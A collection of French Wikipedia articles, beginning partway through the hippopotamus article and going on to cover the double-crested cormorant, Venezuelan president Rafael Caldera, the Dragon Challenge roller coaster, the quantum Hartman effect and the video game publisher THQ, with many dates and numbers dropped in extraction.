Une ébauche de lignée évolutive peut être tracée à partir des espèces de l'Éocène et de l’Oligocène : "Anthracotherium" et "Elomeryx" en passant par les espèces du Miocène "Merycopotamus" et "Libycosaurus" et par les derniers "Anthracotheriidae" au Pliocène. "Merycopotamus", "Libycosaurus" et tous les hippopotamidés peuvent être considérés comme un même clade, "Libycosaurus" étant le plus proche des hippopotames. Leur ancêtre commun aurait vécu durant le Miocène, il y a d’années. Les hippopotamidés sont ainsi classés dans la famille des Anthracotheriidae. Les "Hippopotamidae" ont probablement évolué en Afrique ; le plus ancien hippopotamidé connu est le genre "Kenyapotamus", qui vivait en Afrique entre d’années avant notre ère. Tandis que les espèces d’hippopotamidés se sont répandues un temps en Asie et en Europe, aucun hippopotame n’a jamais été découvert en Amérique, bien que divers genres d’"Anthracotheriidae" aient émigré vers l’Amérique du Nord au début de l’Oligocène. Entre d’années avant notre ère, un ancêtre de l’hippopotame moderne, "Archaeopotamus", vivait en Afrique et au Moyen-Orient.
Bien que l’on ne connaisse que peu de fossiles d’hippopotames, les deux genres actuels, "Hippopotamus" et "Choeropsis" (parfois appelé "Hexaprotodon"), pourraient avoir divergé il y a d’années. Les taxonomistes ne sont pas d’accord sur la classification de l'hippopotame nain tantôt placé dans le genre "Hexaprotodon" ; un genre apparemment paraphylétique, qui comprend également plusieurs espèces d’hippopotames d’Asie aujourd’hui disparus, et plus étroitement apparenté à "Hippopotamus" – tantôt dans le genre "Choeropsis", un genre plus ancien et basal.
L'Hippopotame amphibie et l'Homme.
Conservation.
Des études génétiques laissent penser que les hippopotames communs en Afrique ont connu un accroissement de population important en Afrique durant le Pléistocène, que l’on attribue à une augmentation des points d’eau à la fin de cette ère. Cette découverte est à mettre en parallèle avec la situation actuelle, puisque les populations d’hippopotames sont aujourd’hui menacées dans le continent par la perte de leur accès à l’eau douce. Les hippopotames sont aussi victimes de la chasse et du braconnage. En mai 2006, l’hippopotame est identifié comme une espèce vulnérable sur la liste rouge de l'Union internationale pour la conservation de la nature (UICN), avec une population estimée à entre 125,000 et 150,000 hippopotames, un déclin de 7 % à 20 % par rapport à l’étude de l’UICN de 1996. La Zambie () et la Tanzanie (–) présente les plus grandes populations.
En 2005, la population d'hippopotames du parc national des Virunga en République démocratique du Congo était tombée à 800 ou alors qu'elle en comptait environ dans le milieu des années 1970, provoquant des inquiétudes quant à la survie de cette population. Ce déclin est attribué aux dégâts causés par la Deuxième Guerre du Congo. On croit que les braconniers sont d'anciens rebelles Hutus, des soldats congolais mal payés et des milices locales. Les braconniers chassent pour se nourrir, mais aussi pour le profit financier. La vente de viande d’hippopotame est illégale mais il est difficile d’enrayer le marché noir dont il fait l’objet dans le parc national des Virunga : la viande se vend si vite qu'il est difficile pour les fonctionnaires du WWF d'intervenir. La viande d’hippopotame est considérée comme un mets délicat dans certaines régions d’Afrique centrale, et leurs dents sont devenues un substitut à l’ivoire d’éléphant.
Attaques sur l’Homme.
L’hippopotame amphibie est considéré comme une espèce très agressive et a souvent été vu chargeant et attaquant des bateaux. Ils peuvent faire chavirer les petites embarcations et blesser voire tuer leurs occupants, qui peuvent également être victimes du courant. Au Niger par exemple, en novembre 2014, un hippopotame a fait chavirer un bateau et causé la mort de . Comme les hippopotames peuvent se rendre dans les cultures proches des rivières et les ravager, les Hommes peuvent également entrer en conflits avec eux, ce qui peut causer des blessures et des morts des deux côtés.
Hippopotame d'Amérique.
En 1910, les États-Unis sont au bord de la crise : la population ne cesse de croître, il n'y a plus de nouvelles terres à exploiter et si rien n'est fait, une pénurie de viande sans précédent frappera le pays. Mais un petit groupe d'hommes a une solution, une idée audacieuse approuvée par l'ancien président Theodore Roosevelt et le "New York Times". Leur plan : importer des hippopotames, les faire paître dans les bayous de la Louisiane, et convaincre les Américains de les manger. se justifiait en expliquant que les hippopotames allaient manger la Jacinthe d’eau invasive qui obstruait les rivières et produire de la viande pour résoudre le manque de nourriture qui frappait la population américaine. S'il y a quelque chose d'encore plus étrange que cette idée, ce sont bien les deux hommes qui la promeuvent : Frederick Russell Burnham, un aventurier qui s'est battu dans les guerres apaches et les conflits coloniaux d'Afrique — Burnham a inspiré la création des boy-scouts —, et Fritz Joubert Duquesne, surnommé « la Panthère noire », un arnaqueur et saboteur qui ne croit en rien d'autre que la vengeance (sa famille Afrikaner ayant été décimée par les Britanniques lors de la seconde guerre des Boers) et la gloire.
Il existe également une population d'hippopotames en Colombie, provenant de l'élevage privé du baron de la drogue déchu Pablo Escobar : après la ruine de son domaine, les animaux se sont dispersés dans la nature et en l'absence de prédateurs ou de compétiteurs sérieux, ont prospéré dans toute une région au nord-ouest de Bogota, avec une population en expansion d'au moins .
Mythes et littératures.
La première preuve de relations entre les humains et les hippopotames retrouvée correspond à des traces de découpe sur des os d’hippopotames dans la formation de Bouri date d’environ . Des peintures et gravures ultérieures montrant des hippopotames en train de se faire chasser ont été retrouvées dans des montagnes du centre du Sahara, datant de 4 000–, près de Djanet dans le Tassili n'Ajjer. Les anciens Égyptiens voyaient les hippopotames comme des résidents féroces du Nil.
L'animal, familier du Nil, prête son visage massif à Taouret (« La grande »), la déesse hippopotame du panthéon égyptien ; mais aussi au monstre Béhémoth des Hébreux (l'hippopotame étant craint pour son agressivité). Dans l'Égypte antique, l'hippopotame mâle est aussi un des visages de Seth, tout aussi agressif ; Horus et lui se muent en hippopotames pour se livrer à une compétition d'apnée.

</doc>
<doc id="568246" url="https://fr.wikipedia.org/wiki?curid=568246" title="Emmanuel Joseph Siéyès">
Emmanuel Joseph Siéyès



</doc>
<doc id="568248" url="https://fr.wikipedia.org/wiki?curid=568248" title="Universal Creative">
Universal Creative

Universal Creative est une division d'Universal Destinations &amp; Experiences spécialisée dans la recherche et développement qui conçoit des attractions pour les parcs d'attractions Universal Studios. 
C'est l'équivalent Universal de Walt Disney Imagineering. De 1968 à 1997, Universal Creative s'appelait MCA Planning and Development. En 1997, quand MCA a été vendu à Seagram, qui a repris le nom MCA, la société a été renommée Universal Creative.

</doc>
<doc id="568254" url="https://fr.wikipedia.org/wiki?curid=568254" title="Cormoran à aigrettes">
Cormoran à aigrettes

Le Cormoran à aigrettes (Nannopterum auritum, anciennement "Phalacrocorax auritus") est une espèce d'oiseaux marins se trouvant en Amérique centrale, dans les Caraïbes et en Amérique du Nord. Autrefois menacée par l'utilisation du DDT, cette espèce a vu ses effectifs augmenter.
Description.
Le Cormoran à aigrettes est un oiseau aquatique de grande taille avec un corps trapu, un long cou, une queue de taille moyenne, des doigts palmés et un bec crochu. Il mesure entre 70 et 90 centimètres de long avec une envergure de 114-132 cm. Il pèse entre et grammes. Il n'y a pas de dimorphisme sexuel chez cette espèce.
Plumage des adultes.
Cette espèce possède un plumage de couleur sombre avec un sac gulaire et les lores jaune (en hiver) ou orange (en été). Le plumage nuptial des adultes est noir avec le dos et les couvertures alaires gris foncé vers le centre. Les aigrettes, qui donnent à l'espèce son nom, sont présentes uniquement lors de la saison de reproduction et sont soit blanches, soit noires, ou un mélange des deux. Elles sont localisées juste au-dessus des yeux. Le bec est de coloration sombre.
Plumage des juvéniles.
Le plumage des juvéniles est d'un gris sombre ou brunâtre. Les parties inférieures sont plus pâles que le dos, la gorge est pâle et la poitrine s'assombrit graduellement vers le ventre. Avec l'âge, le plumage devient plus foncé. Le bec des juvéniles est surtout orange ou jaunâtre.
Comportement.
Locomotion.
Le Cormoran à aigrettes nage le corps enfoncé dans l'eau, et quelquefois seulement son cou et sa tête sont visibles. Il plonge à partir de la surface. Il utilise ses pieds pour se propulser sous l'eau et peut plonger à une profondeur de 1,5 à 7,5 mètres pendant 30-70 secondes. Le plumage n'étant pas totalement étanche, il peut passer après la plongée de longues périodes debout avec les ailes ouvertes, ce qui permet de sécher les plumes. Cette espèce vole souvent au ras de l'eau, le bec légèrement relevé et les individus quittent souvent la colonie à la queue leu leu.
Alimentation.
La nourriture est prise en mer, dans les lacs d’eau douce et dans les rivières. Les Cormorans à aigrettes consomment surtout du poisson, mais quelquefois se nourrissent d’amphibiens et de crustacés. Comme tous les cormorans, cette espèce plonge pour trouver ses proies. Les plus petits poissons peuvent être consommés tandis que l’oiseau est encore sous l’eau mais les proies plus grandes sont généralement amenées à la surface avant d’être mangées. Les cormorans rejettent des pelotes de régurgitation contenant les matériaux non digérés de leurs proies comme des os. Ces pelotes peuvent être disséquées par les biologistes afin de déterminer le régime alimentaire des cormorans.
Comportement social.
Le Cormoran à aigrettes possède un cri grogné guttural et bas.
Reproduction.
La reproduction a lieu près des zones côtières ainsi que près des lacs et rivières. Les Cormorans à aigrettes nichent dans les arbres, sur des falaises ou sur le sol des îles convenables. C’est une espèce grégaire qui niche généralement en colonie, souvent en compagnie d’autres espèces aquatiques.
Répartition et habitat.
Le Cormoran à aigrettes est une espèce commune et répandue en Amérique du Nord. Il migre à partir des régions plus froides de son aire de reproduction, comme l'est du Canada, et passe l'hiver partout où les eaux sont libres de glace. En effet, il se retrouve au nord de l'Alaska sur la côte ouest et au sud de la Nouvelle-Angleterre sur la côte est. Il peut également se retrouver vers le sud jusqu'au Mexique, en Floride et aux Bahamas. Il a été observé en Europe en Grande-Bretagne, en Irlande et aux Açores.
Systématique.
D'après la classification de référence (version 14.1, 2024) de l'Union internationale des ornithologues, le Cormoran à aigrettes possède 5 sous-espèces (ordre philogénique) :
"N. a. cincinatum" appelé en anglais « White-crested Cormorant », présentement, il s'agit de la sous-espèce avec la répartition géographique la plus restreinte et avec la population la plus faible. Elle se retrouve le long de la côte sud de l'Alaska et aux îles Aléoutiennes (plus spécifiquement de Kodiak à l'ouest jusqu'à Chuginidak aux Aléoutiennes). Historiquement, son aire de répartition s'étendait à l'est jusqu'aux Near Islands mais, possiblement à cause de l'introduction de renards, il n'y avait plus d'adultes reproducteurs au milieu des années 1930.
Le Cormoran à aigrettes et l'homme.
Étymologie.
Son nom scientifique est dérivé du grec ancien / (de / , « chauve » et / , « corneille » ou « corbeau ») et du latin "auritus", « oreillard », ce qui fait référence à ses aigrettes.
De même, son nom vernaculaire se réfère aux aigrettes présentes lors du plumage nuptial.
Statut et gestion des populations.
En 1894, Thomas McIlwraith mentionne des groupes « immenses » de cormorans à aigrettes dans son livre "Birds of Ontario". Récemment, Linda Wires et Francesca J. Cuthbert ont affirmé qu'il y a des données solides qui suggèrent que les cormorans étaient autrefois au moins aussi nombreux que maintenant. Il semble qu'ils aient été chassés, comme d'autres espèces gibiers ou prédatrices, avant ou à partir du jusqu'à présent.
Le nombre de cormorans à aigrettes a diminué dans les années 1960 à cause des effets du DDT. En revanche, les populations ont récemment augmenté, ce qui pourrait être dû à une diminution des polluants, notamment le DDT. Il se pourrait également que les étangs de pisciculture aient contribué à l'augmentation des populations au sud de l'aire de répartition. Ces étangs favorisent la survie et la croissance des individus pendant l'hiver.
Il semble que les populations nichant dans la région des Grands Lacs aient bénéficié de l'introduction de "Alosa pseudoharengus" (un poisson proie du genre alose) dont la présence a produit des conditions optimales d'alimentation et donc de succès reproducteur. Les cormorans à aigrettes consomment aussi d'autres espèces et ont été impliqués dans le déclin des populations de poissons pêchés dans les Grands Lacs et ailleurs. Le rôle exact des cormorans à aigrettes par rapport à ces déclins est débattu par les scientifiques, mais certains croient que les cormorans sont un facteur pour certaines populations et dans certains lieux. Lorsque les cormorans sont perçus comme étant en compétition avec les pêcheurs, les colonies peuvent être persécutées.
Les membres du public ayant demandé le contrôle des populations, le United States Fish and Wildlife Service (habituellement chargé de la protection de cette espèce) a récemment donné des options de gestion des populations à d'autres paliers de gouvernement. Ces options incluent la chasse et des mesures pour empêcher la reproduction. L'U.S. Fish and Wildlife Service supervise ces activités et les mesures de contrôle des populations ne sont pas menées par le grand public (pas de saison de chasse). Aux États-Unis et au Canada, plusieurs agences gouvernementales essaient de déterminer la meilleure façon de gérer la situation.

</doc>
<doc id="568260" url="https://fr.wikipedia.org/wiki?curid=568260" title="Rafael Caldera">
Rafael Caldera

Rafael Antonio Caldera Rodríguez , né le à San Felipe, État d'Yaracuy et mort le à Caracas, est un homme d'État vénézuélien. Il est président du Venezuela à deux reprises, du au et du au .
Jeunesse et avant-guerre.
Orphelin à deux ans, il fait ses études chez les jésuites, participe à des organisations catholiques et effectue des études de droit et de sociologie à l'université centrale du Venezuela (1931-38). Secrétaire des Jeunesses catholiques, il participe à la fondation de l"'Unión Nacional Estudiantil" (UNE) en 1936, qui se transforme deux ans plus tard en parti, l'"Acción Electoral" (AE). À cette époque, l'UNE est à droite, soutenant clairement le franquisme. L'AE s'intégra au "Movimiento de Acción Nacional" qui fournira l'une des bases du Comité d'organisation politique électorale indépendante (COPEI, démocrate-chrétien) en 1946. Jeune député, Caldera se rend à Washington en 1942, rencontrant Jacques Maritain, dont il contribue à introduire la pensée au Venezuela.
Après son doctorat, il devint professeur, et fut membre fondateur de l'Association latino-américaine de sociologie (1950) et président de l'Association vénézuélienne de sociologie (1958-1967). Membre de l' et directeur de l'Institut vénézuélien du droit du travail (1958-66), il est aussi considéré comme un modernisateur du droit du travail, et est l'auteur de plusieurs ouvrages sur Andrés Bello et Simón Bolívar.
Après la Seconde Guerre mondiale.
Créateur en 1946 du COPEI, destiné à diffuser les idées du catholicisme social, celui-ci obtient 19 députés aux élections d', devenant la deuxième force du pays, loin derrière, toutefois, l'Action démocratique (AD, social-démocrate) qui a 137 sièges. Celui-ci met en œuvre un programme anti-clérical (fermeture écoles religieuses, etc.), qui voit l'Église entrer dans l'arène politique aux côtés du COPEI.
Chef du COPEI, transformé en parti en 1948, Caldera se présente à l', mais est vaincu par le candidat de l'AD, Rómulo Gallegos. Pendant la dictature de Marcos Pérez Jiménez (1948-1958) il connait la prison, puis part en exil. Il est cependant nommé procureur général sous le gouvernement provisoire de Wolfgang Larrazábal (1958), poste qu'il abandonne pour se présenter à la , étant à nouveau battu par Rómulo Betancourt (AD). Il signe néanmoins avec l'AD et l'Union républicaine démocratique (URD) le pacte de Punto Fijo (), qui pose les bases de la démocratie vénézuélienne.
Lors du retour de la démocratie, le COPEI est l'un des deux grands partis vénézuélien, avec l'Action démocratique (sociale-démocrate). Caldera préside l'Organisation démocrate-chrétienne d'Amérique latine de 1964 à 1968, ainsi que l'Union mondiale démocrate-chrétienne (devenue Internationale démocrate centriste) de 1967 à 1968.
Président (1969-1974).
Il est élu président d'une courte tête face à son adversaire Gonzalo Barrios de l'Action démocratique, disposant de seulement trente-deux mille voix d’avance.
Il ne dispose pas de majorité parlementaire, mais accélère la pacification du pays (trêve avec la guérilla et levée de l'interdiction du Parti communiste et du Mouvement de la Gauche révolutionnaire). Caldera n'hésite cependant pas à réprimer la gauche, raison pour laquelle il ferme définitivement l"'Escuela Técnica Industrial", et, pendant deux ans, l'Université centrale.
Il signe le protocole de Port d'Espagne (1970) qui règle provisoirement un conflit frontalier avec le Guyana. Avec l'AD, il réforme la , ajoutant une clause empêchant toute personne condamnée à plus de trois ans de prison de se présenter aux élections: celle-ci vise l'ex-dictateur Marcos Pérez Jiménez, qui pensait être candidat à la .
Plusieurs grands chantiers ont lieu sous sa présidence (inauguration du en 1974, début des travaux du complexe pétro-chimique d'El Tablazo dans l'État de Zulia, etc.). En , il passe la main à Carlos Andrés Pérez (AD).
Des années 1980 à 1999.
Après avoir laissé passer la période de 10 ans, pendant laquelle la Constitution lui interdisait de se présenter à nouveau à la présidentielle, il est à nouveau candidat de COPEI à l', mais perd face au candidat de l'AD, Jaime Lusinchi. Battu aux primaires de 1987 par , il quitte le COPEI et fonde "".
Après les émeutes du Caracazo en , il déclare, le jour de la tentative de putsch militaire, à laquelle participe le futur président Hugo Chávez (), « il est difficile de demander au peuple de s'immoler pour la liberté et la démocratie, quand il pense que la liberté et la démocratie ne sont pas capable de lui donner à manger ».
Ces prises de position lui permettent d'être élu en 1993, soutenu par une majorité comportant des sociaux-démocrates, des communistes et d'autres représentants de gauche (Mouvement vers le Socialisme, ou MAS, Mouvement électoral du peuple). Teodoro Petkoff (MAS) obtient le portefeuille des Finances, et celui des Frontières; d'autres ministères sont donnés à des indépendants.
En , lors d’une visite de Bill Clinton à Caracas, un accord de coopération pour la lutte contre le narcotrafic (11 millions de dollars) est signé. Le Venezuela est alors décrit par les autorités américaines comme « la plus importante route de contrebande du narcotrafic depuis la Colombie jusqu’aux marchés illicites. Le pays sert de zone de transit pour environ 100 tonnes de cocaïne et 10 tonnes d’héroïne par an ».
Il amnistie les auteurs du putsch manqué de 1992, lesquels fondent, en 1997, le Mouvement Cinquième République, vainqueur à l'élection présidentielle vénézuélienne de 1998. Malgré la crise bancaire de 1994, qui le pousse à présenter un programme économique contre l'inflation, l', le pays s'apaise, tandis que Rafael Caldera assure la démocratie et la recherche de consensus national.
Pour lutter contre la crise qui sévit, Caldera décide cependant de suspendre certaines garanties constitutionnelles, en particulier celles concernant la libre-entreprise, ce qui est, au vu de la situation, toléré par la communauté internationale, mais moins par les milieux d'affaires vénézuéliens. Décidant finalement d'appeler à l'aide le Fonds monétaire international (FMI), il dévalue le bolívar de 70 % et opère un tournant politique en mettant en place une politique de rigueur : il lève le contrôle des changes, privatise le secteur public et met en œuvre un programme de réduction du déficit budgétaire, organisant aussi une réforme des assurances sociales (chômage, etc.). Ces mesures provoquent le mécontentement populaire (manifestations, etc.), tandis qu'elles le contraignent à chercher l'appui de l'Action démocratique, les partis de gauche s'y opposant. Plusieurs figures de l'AD entrent ainsi au gouvernement.
Fin de vie.
Atteint de la maladie de Parkinson, il meurt le à l'âge de 93 ans. Son épouse Alicia est morte en 2011 à 87 ans.
Famille.
Caldera a six enfants, dont Juan José Caldera, député de l'État d'Yaracuy de 2000 à 2006.

</doc>
<doc id="568261" url="https://fr.wikipedia.org/wiki?curid=568261" title="Achille François du Chastellet">
Achille François du Chastellet

Achille François de Lascaris d'Urfé, marquis du Chastellet dit « Du Châtelet », né le au Château de la Bastie d'Urfé, à Saint-Étienne-le-Molard (Loire), mort en prison le à Paris, est un général de division de la Révolution française.
Biographie.
Il est le dernier descendant de la famille d'Urfé.
Avant la Révolution.
À l'âge de dix-sept ans, le , il commence sa carrière militaire, comme sous-lieutenant en second au régiment du roi. Il suit François Claude Amour, marquis de Bouillé en qualité d'aide de camp durant la guerre d'Indépendance américaine. Le , il est nommé mestre de camp au régiment de chasseurs des Vosges.
Sous la Révolution.
Il est nommé colonel le au régiment de chasseurs à cheval, et promu général de brigade le , puis général de division le suivant. Il pose sa candidature au ministère de la Guerre en , mais Pierre Riel de Beurnonville remporte le portefeuille par 356 voix contre 216 pour Achille François de Lascaris d'Urfé, marquis du Chastellet. Le , à cause de ses origines nobles, on le contraint à donner sa démission. Il est suspecté de complicité avec le général Charles-François Dumouriez sous les ordres duquel il a servi quelques années auparavant.
Très lié avec Condorcet, ce jeune homme érudit, imbu des idées républicaines qu'il a ramenées d'Amérique, collabore à son journal "Le Républicain" dont l'existence est brève (1791). Il est aussi l'ami d'Étienne Clavière et de Jacques Pierre Brissot. Ces amitiés le perdent : il est arrêté le . Il croupit dans sa geôle, où semble-t-il on l'a oublié. Fatigué d'attendre, démoralisé, très atteint par l'exécution du général Nicolas Luckner et de tant d'autres de ses compagnons d'armes, rendu dépressif par ce long séjour en prison, il se suicide le , en avalant du poison, à trente-quatre ans.

</doc>
<doc id="568264" url="https://fr.wikipedia.org/wiki?curid=568264" title="Alain Schneider">
Alain Schneider

Alain Schneider peut désigner :

</doc>
<doc id="568265" url="https://fr.wikipedia.org/wiki?curid=568265" title="Phalacrocorax auritus">
Phalacrocorax auritus



</doc>
<doc id="568266" url="https://fr.wikipedia.org/wiki?curid=568266" title="Dragon Challenge">
Dragon Challenge

Dragon Challenge est le nom donné à des montagnes russes inversées en duel situées dans le parc américain Universal's Islands of Adventure.
Les deux parcours de montagnes russes ont été construits par Bolliger &amp; Mabillard et inaugurés le sous le nom Dueling Dragons. Les deux parcours prenaient alors pour thème le dragon de feu et le dragon de glace s'affrontant dans les airs.
L'attraction reçoit un nouveau thème en 2010 pour intégrer la nouvelle zone thématique du parc consacrée à l'univers de "Harry Potter" : "The Wizarding World of Harry Potter". Renommée "Dragon Challenge", ce sont depuis les dragons "Boutefeu Chinois" et "Magyar à pointes" qui s'affrontent.
L'attraction est détruite en automne 2017 et remplacée par l'attraction "Hagrid's Magical Creatures Motorbike Adventure" en juin 2019.
Histoire.
"Dueling Dragon".
"Dueling Dragons" est parmi les attractions présentes dès l'ouverture de "Universal's Islands of Adventure". Inaugurées en même temps que le parc le , les montagnes russes étaient rattachées à la zone thématique « "The Lost Continent" » (Le continent perdu). L'attraction prend pour thème l'affrontement de deux dragons ; celui de feu contre celui de glace. La file d'attente unique pour les deux attractions se divise en deux à mi-parcours pour permettre aux visiteurs de choisir leur dragon.
Les deux parcours ne possèdent pas le même tracé mais ceux-ci ont été pensés par le constructeur Bolliger &amp; Mabillard et le bureau d'étude Stengel pour donner, tout au long du tour, l'impression que les deux dragons font une bataille aérienne en s'entrecroisant à plusieurs reprises.
"Harry Potter" et transformations.
En 2010, Universal's Islands of Adventure ouvre "The Wizarding World of Harry Potter", une nouvelle zone consacrée à l'univers de "Harry Potter". À cette occasion, "Dueling Dragons" intègre cette zone et reçoit un nouveau nom : "Dragon Challenge". Le nouveau scénario de l'attraction est basé sur le Tournoi des Trois Sorciers du film "Harry Potter et la Coupe de feu" et met en scène deux des quatre dragons que les candidats doivent affronter : le "Boutefeu chinois" ("Chinese Fireball" en anglais) et le "Magyar à Pointes" ("Hungarian Horntail").
Le porche de l'attraction, avec la reproduction des deux dragons, a été démoli en octobre 2008. Pendant les travaux, l'attraction est restée ouverte une grande partie du temps avec quelques aménagements de la file d'attente et de la gare.
Le 24 juillet 2017, les responsables d'Universal Orlando ont annoncé que "Dragon Challenge" fermerait après le 4 septembre 2017 pour ouvrir la voie à une nouvelle attraction basée sur la franchise "Harry Potter" pour 2019. L'attraction est détruite à l'automne 2017 à la suite de nombreux problèmes techniques et à une baisse notable de sa fréquentation. Elle est remplacée par l'attraction "Hagrid's Magical Creatures Motorbike Adventure" à partir du 13 juin 2019.

</doc>
<doc id="568269" url="https://fr.wikipedia.org/wiki?curid=568269" title="Misérable Miracle">
Misérable Miracle

Misérable Miracle est un livre d'Henri Michaux, paru en 1956, qui traite de son expérience de la mescaline.

</doc>
<doc id="568271" url="https://fr.wikipedia.org/wiki?curid=568271" title="Alain Schneider (chanteur)">
Alain Schneider (chanteur)

Alain Schneider, né le à Raon-l'Étape dans les Vosges, est un musicien et auteur-compositeur-interprète français dont le répertoire s'adresse particulièrement aux enfants.
Sa réputation a commencé avec le travail qu'il a réalisé pour les cédéroms de soutien scolaire Adibou au début des années 2000 ; il a publié ensuite 9 albums. Chanteur engagé, il écrit des textes aussi intéressants pour les enfants que les parents. Son goût de la langue, des jeux de mots et des animaux le rapprochent d'un chanteur comme Thomas Fersen. Il est parfois considéré comme successeur d'Henri Dès. Télérama l'a surnommé "Alain Souchon pour enfants". Il est le père de quatre filles et grand-père de 5 petits-enfants.
Distinctions.
Il a été couronné par de nombreuses distinctions :

</doc>
<doc id="568272" url="https://fr.wikipedia.org/wiki?curid=568272" title="Porc-épic d’Amérique du Nord">
Porc-épic d’Amérique du Nord



</doc>
<doc id="568274" url="https://fr.wikipedia.org/wiki?curid=568274" title="Porc-épic d’Amérique">
Porc-épic d’Amérique



</doc>
<doc id="568278" url="https://fr.wikipedia.org/wiki?curid=568278" title="Effet Hartman">
Effet Hartman

Lors de la traversée par effet tunnel il peut s'avérer que le sommet du paquet d'ondes, associé à une particule, apparaisse franchir la barrière de potentiel à une vitesse supérieure à la vitesse de la lumière. L'effet Hartman, ainsi nommé parce que d'abord décrit par Thomas E. Hartman en 1962, est associé à une très faible transmitivité que montre la barrière tunnel. Pour les particules de masse non nulle, il est assez souvent caché ou pollué par le filtrage haute fréquence que constitue la barrière, due à la grande dispersion de la transmitivité.
Une étude théorique, ou numérique, révèle facilement que le (défini par le seul moyen du suivi du sommet du paquet d'onde) devient indépendant de l'épaisseur de la barrière, menant à une vitesse supraluminique. L'analyse théorique relie le phénomène au suivi du sommet du paquet, obtenu par la méthode de la phase stationnaire appliquée sur le paquet d'onde incident et le paquet d'onde transmis.
Le phénomène existe aussi lorsque l'on traite la particule quantique d'une façon relativiste, ou que l'on travaille directement sur des photons. C'est d'ailleurs sur ceux-ci que les premières manifestations expérimentales ont été observées. D'autres cas sont à citer à propos de signaux électromagnétiques sur des lignes.
La relativité restreinte n'est pas violée, en ce sens que l'information portée par ces paquets d'ondes ne peut se déplacer plus vite que la vitesse de la lumière : ce n'est pas le sommet du paquet qui est la signature de l'information.
Les physiciens ne mettent pas en doute l'effet Hartman, mais plutôt l'interprétation du phénomène comme la définition d'un temps de traversée tunnel.
Analyse.
Pour un mode donné appartenant au spectre du paquet d'ondes, le coefficient de transmission en amplitude peut s'exprimer en fonction de son module et de sa phase, tous les deux fonctions du potentiel correspondant à la barrière et de l'énergie E :
Une analyse par la méthode de la phase stationnaire, appliquée sur la partie incidente du paquet d'ondes (de spectre spatial assez fin) et sur sa partie transmise, montre que la durée entre l'arrivée du sommet du paquet incident et la sortie du paquet transmis prend la forme simple : 
On s'aperçoit alors que cette durée tend vers une valeur constante pour des largeurs L de barrière tunnel croissantes. Ceci permet d'envisager une grandeur ayant les dimensions d'une vitesse, V = L/formula_3, pouvant atteindre ou dépasser la vitesse de la lumière.
Illustration.
Un paquet d'ondes gaussien (représentatif d'une particule de masse non nulle) d'énergie faible est incident sur une barrière quantique. La figure, un instantané du passage révèle, outre le phénomène d'interférences entre le paquet réfléchi et le paquet incident, le sommet du paquet transmis, qui apparaît en avance par rapport au même paquet qui n'aurait pas eu à subir la barrière de potentiel (courbe en pointillés). Une telle figure est obtenue pour une transmittivité faible et la partie transmise a donc été augmentée d'un facteur important afin de la rendre visible.
Le cartouche fournit un zoom du sommet. L'analyse théorique (et numérique) montre que l'avance du paquet transmis a deux composantes : l'une est l'effet Hartman, l'autre est due au filtrage des fréquences, menant à une déformation du paquet transmis (il n'est plus tout à fait gaussien) favorisant les hautes fréquences ; il s'ensuit que le paquet transmis prendra, au cours du temps, une avance de plus en plus importante.

</doc>
<doc id="568282" url="https://fr.wikipedia.org/wiki?curid=568282" title="THQ">
THQ

THQ Inc. était un éditeur et un développeur américain de jeux vidéo. La société fut fondée en avril 1990 par Jack Friedman et basée à Agoura Hills, en Californie.
L'entreprise ferme en 2013 à la suite de sa faillite de , et après avoir vendu ses studios et ses franchises phares.
THQ possédait des bureaux en Amérique du Nord, en Europe et en Asie-Pacifique.
THQ a publié la quasi-totalité des titres de NewKidCo au Japon car la société n'y avait pas de bureau.
Historique.
Historique et fondation (1990-1999).
THQ Inc. a été fondée par Jack Friedman, cofondateur de LJN, en avril 1990. "THQ" est l'acronyme de Toy HeadQuarters.
En septembre 1990, THQ a acquis New Ventures, une division de Broderbund. 
En 1991, Trinity Acquisition Corp. a accepté d'acquérir et de fusionner avec THQ. L'opération consistait en un échange d'actions évalué à environ 33 millions de dollars, les actionnaires de THQ détenant 51,7 % de la nouvelle entité. Le nom de THQ a été conservé pour la nouvelle société et Friedman en a été nommé président. 
En 1993, THQ a ensuite acquis le développeur de jeux vidéo "Black Pearl Software" de Chicago. Après l'acquisition, THQ a utilisé le nom de "Black Pearl Software" pour ses jeux Sega, tandis que le nom de Malibu Games a été utilisé pour les jeux Nintendo.
En 1994, THQ se retire entièrement de l'industrie du jouet pour se focaliser uniquement sur la production de jeux vidéo. 
En 1995, Jack Friedman quitte la société pour cofonder le fabricant de jouets Jakks Pacific. 
Lors du Consumer Electronics Show de l'hiver 1995, l'entreprise signe un accord avec Electronic Arts pour développer des jeux pour leurs consoles de salon 16 bits et 8 bits et leurs titres portables. C'est à ce moment précis que le nom "Black Pearl Software" sera utilisé pour les jeux 8 bits et 16 bits tandis que THQ a introduit la marque Kokopeli Digital Studios pour ses jeux 32 bits. 
En 1997, THQ a été réincorporé en tant que société du Delaware.
En 1999, la boite acquiert le développeur de jeux vidéo Pacific Coast Power &amp; Light de San Jose et signe un accord pour publier les jeux vidéo Power Rangers. Cette même année, elle contracte un accord de licence avec le développeur de jeux britannique Codemasters afin de proposer ses titres sur le marché des ordinateurs de poche.
Croissance de l'entreprise et acquisitions (2000-2009).
En février 2000, THQ affronte un recours collectif pour violation des lois fédérales sur la sécurité en raison de la non-divulgation d'informations importantes. En septembre de la même année, la société a étendu ses capacités internes de développement de produits avec l'acquisition de Volition, situé à Champaign, dans l'Illinois. Depuis lors, le système de studios internes de THQ s'est développé pour atteindre onze studios à travers le monde avec des capacités distinctes sur toutes les plateformes de jeu viables. Certains de ces studios, tels que Relic Entertainment, Vigil Games, Blue Tongue Entertainment, Juice Games, Kaos Studios et Volition, ont travaillé sur des jeux destinés aux consoles de nouvelle génération ainsi qu'aux PC. THQ a ensuite racheté Vigil Games en 2006.
En 2000, la société a signé un accord avec Fox Interactive pour porter cinq de ses titres sur le marché du Game Boy Color, comme la franchise Croc. En 2001, THQ contracte un accord étendu avec Nickelodeon pour développer des jeux vidéo basés qui concerne leurs franchises ainsi que les droits de jeu sur ordinateur de Rugrats, SpongeBob SquarePants et Rocket Power et les droits sur console et ordinateur d'autres émissions de Nickelodeon comme Jimmy Neutron : Boy Genius et The Wild Thornberrys. L'accord implique également les jeux basés sur des propriétés intellectuelles originales à l'instar de Tak and the Power of Juju, avec la possibilité que THQ lance d'abord un jeu pour ensuite créer un dessin animé sur Nickelodeon.
